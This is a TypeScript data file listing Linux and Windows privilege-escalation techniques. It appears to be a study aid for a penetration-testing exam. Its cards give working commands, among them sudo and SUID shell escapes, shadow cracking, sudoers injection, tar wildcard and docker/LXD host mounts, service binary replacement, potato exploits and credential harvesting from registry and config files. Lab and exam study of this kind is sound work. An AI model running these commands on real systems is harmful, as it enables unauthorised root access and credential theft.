import type { Technique } from "./methodology";

export const PRIVESC_TECHNIQUES: Technique[] = [
  {
    id: "lin-named",
    section: "Linux",
    title: "Named binary you may run",
    look: "sudo -l or a SUID file names a real program: find, vim, vi, awk, less, more, man, env, python, perl, ruby, tar, zip, nmap, bash, sh, tee, ftp, cp. Read the line. If sudoers pins the arguments, the free one-liner is dead.",
    cmd: `# NOPASSWD with no pinned args. SUID: drop sudo, and use sh -p
sudo find . -exec /bin/sh -p \\; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/hosts
# then type: !/bin/sh
sudo env /bin/sh
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh";'
sudo bash
# SUID bash specifically
/usr/local/bin/bash -p`,
    alive: "(root) NOPASSWD: /usr/bin/find\nand the shell's euid is 0. Or a SUID bash that only works with -p.",
    dead: `NOPASSWD: /usr/bin/find /var/www -name *.log
# arguments are pinned. -exec is not allowed
# nmap 7.x has no --interactive. !sh does nothing
# sudo still asks for a password`,
    next: "One binary, the matching line, once. If it prints 'command not allowed' or 'sorry', that binary is dead. Do not open the GTFOBins page for twenty other tools.",
  },
  {
    id: "lin-doas",
    section: "Linux",
    title: "doas",
    look: "Identify: doas exists and doas -l shows permit nopass as root. A password prompt is not this path.",
    cmd: `# 1. Identify
doas -l
# 2. Escalate
doas /bin/sh
id`,
    alive: `permit nopass <user> as root
uid=0(root) gid=0(root)`,
    dead: "doas: not found. Or doas asks for a password you do not have.",
    next: "Same rule as sudo. A password prompt means leave it.",
  },
  {
    id: "lin-shadow",
    section: "Linux",
    title: "Readable shadow",
    look: "Identify: ls shows you can read /etc/shadow or a backup of it. The hash is not a shell until it cracks.",
    cmd: `# 1. Identify
ls -la /etc/shadow /etc/shadow- /var/backups/shadow.bak 2>/dev/null
cat /etc/shadow
# 2. On Kali, crack the one hash
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
john --show unshadowed.txt
# 3. On the box
su - root`,
    alive: `root:$y$...
john --show prints the password
uid=0(root)`,
    dead: "Permission denied on shadow, and no backup in /var/backups. A hash that exhausts rockyou is also dead for the exam. Do not start a week-long crack.",
    next: "su - root with the cracked password. If only a normal user cracks, su to them and repeat the Linux order as that user.",
  },
  {
    id: "lin-sudoers-w",
    section: "Linux",
    title: "Writable sudoers",
    look: "Identify: find says you can write /etc/sudoers or a file in /etc/sudoers.d. Reading sudoers is not this path.",
    cmd: `# 1. Identify
ls -la /etc/sudoers /etc/sudoers.d
find /etc/sudoers /etc/sudoers.d -writable 2>/dev/null
# 2. Add one line. Do not delete the file.
echo '<user> ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/user
# 3. Escalate
sudo -l
sudo /bin/bash
id`,
    alive: `(root) NOPASSWD: ALL
uid=0(root)`,
    dead: "-r--r----- root root. Readable sudoers with no NOPASSWD for you is information, not a bug.",
    next: "Add a nopasswd line for your user only, sudo -l, take the shell, screenshot. Do not delete the original file.",
  },
  {
    id: "lin-systemd",
    section: "Linux",
    title: "Systemd timers and units",
    look: "Identify: a root timer or service names a unit or a script you can write. Stock apt and fstrim timers are not this path.",
    cmd: `# 1. Identify
systemctl list-timers --all
find /etc/systemd /lib/systemd /usr/lib/systemd -writable -type f 2>/dev/null
ls -la /opt/app/run.sh
# 2. Replace the script the unit already runs
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > /opt/app/run.sh
# 3. Restart only if you are allowed. Otherwise wait one interval.
systemctl restart <service>
ls -la /tmp/rootbash
/tmp/rootbash -p
id`,
    alive: `-rwsr-xr-x root root /tmp/rootbash
uid=0(root)`,
    dead: "find prints nothing. list-timers is the stock apt and fstrim timers. You cannot start a service you do not own.",
    next: "Replace the script, then systemctl restart only if you are allowed. If you cannot restart it, wait one timer interval, not an hour.",
  },
  {
    id: "lin-tar-wild",
    section: "Linux",
    title: "tar wildcard",
    look: "pspy shows root running tar with * in a directory you can write. The crontab you can read often hides this. Two minutes of pspy is the check.",
    cmd: `./pspy64
# if you see: UID=0 tar czf /backup/x.tar *   in a dir you can write
cd /that/dir
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=sh\\ shell.sh`,
    alive: "The next tar run creates /tmp/rootbash and ls -la shows the SUID bit.",
    dead: "pspy never shows tar, or the * is inside quotes with a full file list. Do not plant checkpoint files in /tmp and hope.",
    next: "/tmp/rootbash -p. If the cycle is longer than a few minutes, leave the files and keep enumerating.",
  },
  {
    id: "lin-sock",
    section: "Linux",
    title: "docker socket",
    look: "Identify: the socket exists and docker ps works for you. The group is not always named docker.",
    cmd: `# 1. Identify
ls -la /var/run/docker.sock
id
docker ps
docker image ls
# 2. Mount the host. Use an image that image ls already printed.
docker run -v /:/mnt --rm -it <image> chroot /mnt sh
id
cat /root/proof.txt`,
    alive: `uid=0(root) groups=0(root)
# and /root/proof.txt is the host file`,
    dead: "No such file, or docker ps says permission denied. Being able to read the socket name is not enough.",
    next: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh. If the image pull hangs, use an image docker images already lists.",
  },
  {
    id: "lin-mysql-root",
    section: "Linux",
    title: "MySQL as root",
    look: "The mysqld process user is root, and you can log in, often with no password from localhost. A MySQL shell as a normal user is not privilege escalation.",
    cmd: `ps aux | grep -i mysql | grep -v grep
mysql -u root
# inside mysql, who the server runs as
\\! id`,
    alive: "uid=0 from the \\! id, or you can write a file the root cron will run.",
    dead: "Access denied for root, or mysqld runs as mysql and you already are that user. SELECT version is not a lead.",
    next: "If the shell is root, read proof.txt from it. If you can only write files, write a cron script you already know is executed. Do not build a UDF unless this is the only write you have.",
  },
  {
    id: "lin-proc",
    section: "Linux",
    title: "Passwords in process memory",
    look: "A running command line or environment that still contains a password. Editors and mysql clients do this. It is a cred, then su.",
    cmd: `ps auxww | grep -i -E 'pass|pwd|mysql|ssh' | grep -v grep
# if a pid looks interesting
tr '\\0' '\\n' < /proc/<pid>/environ 2>/dev/null | grep -i -E 'pass|pwd|key'`,
    alive: "A -p or PASSWORD= value that su or mysql accepts.",
    dead: "ps shows only the service name and environ is unreadable. Do not dump every /proc/*/mem.",
    next: "Try the password for root and for every user in /etc/passwd with a real shell.",
  },
  {
    id: "lin-homes",
    section: "Linux",
    title: "Other users' homes",
    look: "A home you can read that is not yours: history, id_rsa, a note, a reused password. Then su or ssh.",
    cmd: `ls -la /home
getent passwd | awk -F: '$3>=1000 && $3<65534 {print $1,$6,$7}'
find /home /root -readable \\( -name 'id_rsa' -o -name '*.kdbx' -o -name '.bash_history' -o -name '*.txt' \\) 2>/dev/null`,
    alive: "A private key or a password in someone else's history, and su or ssh as them works.",
    dead: "Permission denied on every other home. /root denied is normal. Stop.",
    next: "New user means run the Linux order again as them. Their sudo -l is a different answer.",
  },
  {
    id: "lin-tmux",
    section: "Linux",
    title: "tmux and screen",
    look: "Identify: a socket in /tmp or /var/run/screen is readable by you, and the session is not yours.",
    cmd: `# 1. Identify
ls -la /tmp/tmux-* /var/run/screen 2>/dev/null
# 2. Attach
tmux -S /tmp/tmux-0/default attach
# or
screen -x <session>
id`,
    alive: `uid=0(root)
# the prompt was already root before you typed anything`,
    dead: "No sockets, or attach says permission denied. Do not sit in screen -ls.",
    next: "whoami, then proof.txt. The session may already be root.",
  },
  {
    id: "lin-dirtypipe",
    section: "Linux",
    title: "Dirty Pipe only if the version matches",
    look: "Every misconfig card is dead, and uname -r is in the vulnerable window. CVE-2022-0847 is kernel 5.8 through 5.16.10, fixed in 5.16.11, 5.15.25, and 5.10.102. A Ubuntu kernel with a high patch number is often already fixed even if it still says 5.13.",
    cmd: `uname -r
# compare to 5.8 .. 5.16.10
# distro kernels: one public PoC only, static if you compile on Kali`,
    alive: "uname -r is inside that window on an old lab image, and the PoC changes a file you choose.",
    dead: "5.4, 5.15.0-generic with a long Ubuntu suffix, 6.x, or a PoC that errors once. Stop. This is not a reason to try five other kernel bugs.",
    next: "One compile, one run. If it fails, the box is not this bug. Go back to a credential you skipped.",
  },
  {
    id: "lin-lxd",
    section: "Linux",
    title: "LXD group",
    look: "id shows lxd, or the lxd socket is writable by your group. Docker was the other group. This one is a privileged container with the host disk mounted inside it. Do not apt install lxd on the exam box.",
    cmd: `id
lxc image list
# pick a name that list already printed
lxc init <image> privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc -- sh
cat /mnt/root/root/proof.txt`,
    alive: "id includes lxd, an image is already present, and cat of the mounted proof works.",
    dead: "lxc: permission denied, or image list is empty and you do not already have an image file. Do not build one from the internet during the exam.",
    next: "You are root on the host filesystem. Screenshot, then stop the container. lxc stop privesc.",
  },
  {
    id: "lin-finished",
    section: "Linux",
    title: "Linux list is finished",
    look: "You are allowed to look at the kernel only after every line here is dead. This is the whole local list.",
    cmd: `sudo -l; sudo --version; doas -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron* /etc/sudoers /etc/sudoers.d /etc/passwd /etc/shadow
systemctl list-timers --all
id; ls -la /var/run/docker.sock
ss -tlnp; ps auxww | head
find /home /opt /var/www /var/backups -readable -name 'id_rsa' -o -readable -name '.bash_history' 2>/dev/null | head`,
    alive: "Any NOPASSWD, odd SUID, cap_setuid, writable script, readable shadow, docker.sock you can use, lxd, or a password.",
    dead: "Password prompt, stock SUID, empty caps, stock cron, shadow denied, no docker, no lxd, no extra homes. Then and only then: Baron if sudo is 1.8.x, pkexec if the version matches, Dirty Pipe if uname -r is in range. One of those. Not all of them.",
    next: "If the three version checks are dead too, you missed a credential or a web bug. You did not miss a secret kernel exploit.",
  },
  {
    id: "win-which-potato",
    section: "Windows",
    title: "Which potato",
    look: "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is in whoami /priv. Disabled still counts. Missing means this whole card is dead. The OS decides the tool. JuicyPotato on Server 2019 or 2022 is a waste.",
    cmd: `whoami /priv
sc query spooler
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
# spooler RUNNING, x64: PrintSpoofer first
PrintSpoofer64.exe -i -c "cmd /c whoami"
# Server 2019, 2022, Windows 10 1809 and later, or spooler stopped:
GodPotato-NET4.exe -cmd "cmd /c whoami"
# only if .NET 4 is missing
GodPotato-NET2.exe -cmd "cmd /c whoami"`,
    alive: "nt authority\\system",
    dead: `Privilege name not in the list.
# or JuicyPotato CLSID errors on Server 2019/2022. That tool is dead there.
# or dir shows 441 bytes. That file is HTML.
# or two real tools failed once each. Stop.`,
    next: "One success is SYSTEM. Two failures means go back to services, files, and passwords. Do not download a third potato.",
  },
  {
    id: "win-unattend",
    section: "Windows",
    title: "Unattend and sysprep",
    look: "An answer file left on disk. The password is often in plaintext inside <Password> or <LocalAccount>. Search the known paths before a recursive findstr of C:\\.",
    cmd: `dir /s /b C:\\Windows\\Panther\\unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\System32\\Sysprep\\unattend.xml C:\\Windows\\System32\\Sysprep\\sysprep.xml C:\\unattend.xml 2>nul
type C:\\Windows\\Panther\\Unattend.xml`,
    alive: "<Password> or a <Value> that is not *SENSITIVE*DATA* and that password is in Administrators.",
    dead: "File not found on those paths. A recursive search of the whole disk can wait until nothing else is alive.",
    next: "evil-winrm or runas with that user. Then landing checks again. You are not SYSTEM yet.",
  },
  {
    id: "win-autologon",
    section: "Windows",
    title: "Autologon password",
    look: "Winlogon DefaultPassword. Cleartext, and only useful if DefaultUserName is a different, stronger user.",
    cmd: `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v AutoAdminLogon`,
    alive: "DefaultPassword is a real string and that user is in Administrators.",
    dead: "The system was unable to find the specified registry key or value. AutoAdminLogon 0 with no password is dead.",
    next: "Use the password. Do not keep querying Winlogon.",
  },
  {
    id: "win-savecred",
    section: "Windows",
    title: "Saved credentials",
    look: "cmdkey /list shows a saved credential for another user. runas /savecred uses it without the password. An empty list is dead.",
    cmd: `cmdkey /list
runas /savecred /user:ADMINUSER cmd`,
    alive: `Target: Domain:interactive=ADMINBOX\\Administrator
# and the new cmd is that user`,
    dead: "Currently stored credentials: none. Or runas says the credential is invalid.",
    next: "In the new window, whoami /priv. Then the Windows order again as that user.",
  },
  {
    id: "win-dir-write",
    section: "Windows",
    title: "Writable service directory",
    look: "The exe itself is not writable, but icacls on its folder shows your user, Everyone, or BUILTIN\\Users with (M), (F), or WD. You replace the exe by deleting it, or you replace a DLL that already sits in that folder.",
    cmd: `sc qc <svc>
icacls "C:\\Program Files\\Vendor"
icacls "C:\\Program Files\\Vendor\\svc.exe"
dir "C:\\Program Files\\Vendor\\*.dll"
# folder is (M) or (F), the exe is not. Replace the exe by deleting it, or replace a DLL that is already in this folder.
copy "C:\\Program Files\\Vendor\\svc.exe" C:\\Users\\Public\\svc.exe.bak
del "C:\\Program Files\\Vendor\\svc.exe"
copy C:\\Users\\Public\\shell.exe "C:\\Program Files\\Vendor\\svc.exe"
sc stop <svc> & sc start <svc>
whoami`,
    alive: "icacls on the folder shows (M) or (F) for you, the copy lands, and whoami prints nt authority\\system.",
    dead: "Folder is (RX) and the exe is not writable. A new name.dll that the service does not already load will not run. Do not drop random DLL names.",
    next: "Keep the original exe. sc stop and sc start. If you cannot start it, the plant waits for a reboot you may not get. Park it.",
  },
  {
    id: "win-sedebug",
    section: "Windows",
    title: "SeDebugPrivilege",
    look: "Enabled in whoami /priv. You can open processes you do not own, including LSASS. Disabled means you do not have it. This still needs an x64 tool on an x64 OS.",
    cmd: `whoami /priv | findstr /i debug
# x64 binary only, from an elevated or SeDebug shell
# then the SAM card's secretsdump path is cleaner if you can reg save
# SeDebug is the case where you cannot reg save but can still touch LSASS`,
    alive: "SeDebugPrivilege Enabled, and an x64 dump tool prints NTLM hashes.",
    dead: "The privilege is absent or Disabled. A 32-bit tool on Server 2022 returning 0x00000005 is the architecture card, not a missing privilege.",
    next: "Pass the hash. Do not crack a domain admin hash you can already pass.",
  },
  {
    id: "win-takeown",
    section: "Windows",
    title: "SeRestore and SeTakeOwnership",
    look: "Either privilege Enabled. You can take a file the ACL hides, including a copy path toward the SAM. If both are missing or Disabled, this is a ten-second skip.",
    cmd: `whoami /priv | findstr /i "Restore TakeOwnership"
takeown /f C:\\Windows\\System32\\config\\SAM
icacls C:\\Windows\\System32\\config\\SAM /grant %USERNAME%:F`,
    alive: "Enabled, and takeown succeeds.",
    dead: "findstr prints nothing, or the privileges say Disabled. Access is denied on takeown means the privilege is not actually usable.",
    next: "Copy SAM and SYSTEM, secretsdump on Kali. If takeown fails once, stop.",
  },
  {
    id: "win-backup-ops",
    section: "Windows",
    title: "Backup Operators",
    look: "whoami /groups shows Backup Operators even when you skimmed past the privilege name. Same result as SeBackupPrivilege: you can read the SAM.",
    cmd: `whoami /groups | findstr /i "Backup Operators"
whoami /priv | findstr /i backup`,
    alive: "The group is listed and SeBackupPrivilege is Enabled.",
    dead: "Group absent. A group with the privilege Disabled is not a win. Do not invent diskshadow commands.",
    next: "Use the SeBackupPrivilege card. One copy of SAM and SYSTEM.",
  },
  {
    id: "win-apps",
    section: "Windows",
    title: "Saved app passwords",
    look: "FileZilla, WinSCP, PuTTY, TightVNC, SuperPutty. These are files and registry values, not an exploit. One pass.",
    cmd: `dir /s /b C:\\Users\\*sitemanager.xml C:\\Users\\*recentservers.xml 2>nul
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s
reg query "HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions" /s
reg query "HKLM\\SOFTWARE\\TightVNC\\Server" /v Password`,
    alive: "A host, username, and password, or a TightVNC password value you can decode with the method you practised.",
    dead: "File not found and the registry keys are missing. PuTTY sessions with no password stored are just hostnames.",
    next: "The password is tried on SSH, SMB, and WinRM. A VNC password only helps if VNC has no auth and you needed it. Otherwise it is a cred.",
  },
  {
    id: "win-iis",
    section: "Windows",
    title: "IIS config passwords",
    look: "web.config or applicationHost.config with a connection string. You landed on a web user. The SQL password is often the next Windows user too.",
    cmd: `type C:\\inetpub\\wwwroot\\web.config
type C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config
findstr /s /i /m "connectionString password" C:\\inetpub\\*.config 2>nul`,
    alive: "User ID= and Password= in a connection string, and that password works on MSSQL or as a Windows user.",
    dead: "Access is denied on inetpub, or the config has no password. Integrated Security=true means no SQL password is stored.",
    next: "MSSQL as sa is the MSSQL card. A Windows password is evil-winrm.",
  },
  {
    id: "win-task-run",
    section: "Windows",
    title: "Run a task you can change",
    look: "schtasks shows a task running as SYSTEM whose action path you can overwrite, and you are allowed to run it now. If you cannot run it and it is not about to fire, park it.",
    cmd: `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run Run As User"
icacls "C:\\Program Files\\Vendor\\job.exe"
schtasks /run /tn "\\Vendor\\job"`,
    alive: "Run As User is SYSTEM, icacls lets you replace the exe, and /run starts it.",
    dead: "Access is denied on /run, and Next Run Time is not soon. Replacing the file does nothing until something you cannot trigger.",
    next: "Penelope first, then replace, then /run once. whoami in the callback.",
  },
  {
    id: "win-peas-read",
    section: "Windows",
    title: "Reading winPEAS",
    look: "Same rule as linpeas. Colour is not a vulnerability. You re-run whoami /priv, icacls, and sc qc on the one line that matters.",
    cmd: `winPEASx64.exe cmd`,
    alive: "It names a service, a path, or a password you can confirm with the matching card in one command.",
    dead: "A page of red kernel suggestions on Server 2022, or a 'modifiable service' that icacls says is (RX).",
    next: "Confirm by hand. If you cannot confirm it, it is dead. Do not run winPEAS three times.",
  },
  {
    id: "win-serverops",
    section: "Windows",
    title: "Server Operators",
    look: "whoami /groups lists Server Operators. That group can change a service. It is the same binPath trick as a weak service DACL, and you do not need accesschk to know you have it. Do not point it at DNS or NTDS.",
    cmd: `whoami /groups | findstr /i "Server Operators"
sc query state= all | findstr /i "SERVICE_NAME STATE"
sc qc <svc>
sc config <svc> binPath= "C:\\Users\\Public\\shell.exe"
sc stop <svc> & sc start <svc>`,
    alive: "The group is listed, sc qc shows LocalSystem, and the new process is SYSTEM.",
    dead: "findstr prints nothing. Or sc config says Access is denied, which means this shell's token is filtered and the group is not usable from it.",
    next: "Penelope is listening before sc start. One service that is already stopped, or one you can restart. Then put the original binPath back if you wrote it down.",
  },
  {
    id: "win-finished",
    section: "Windows",
    title: "Windows list is finished",
    look: "Kernel suggestions are last, and only if this list is dead. NT AUTHORITY\\SERVICE is not a reason to skip the list. It is a reason to read privileges.",
    cmd: `whoami /all
sc query spooler
wmic service get name,pathname,startname,startmode
cmdkey /list
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
dir /s /b C:\\Windows\\Panther\\unattend.xml C:\\Windows\\System32\\Sysprep\\unattend.xml 2>nul
type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt`,
    alive: "SeImpersonate, SeBackupPrivilege, Server Operators, a writable or unquoted service, both AlwaysInstallElevated keys, a saved cred, an unattend password, or a history password.",
    dead: "Privileges you cannot use, quoted services you cannot write, installer keys missing, no cmdkey, no unattend, empty history. Then one kernel look only if systeminfo is an old build with almost no hotfixes.",
    next: "Server 2022 with a long hotfix list is not a kernel box. Go back to creds and the other host.",
  },
];
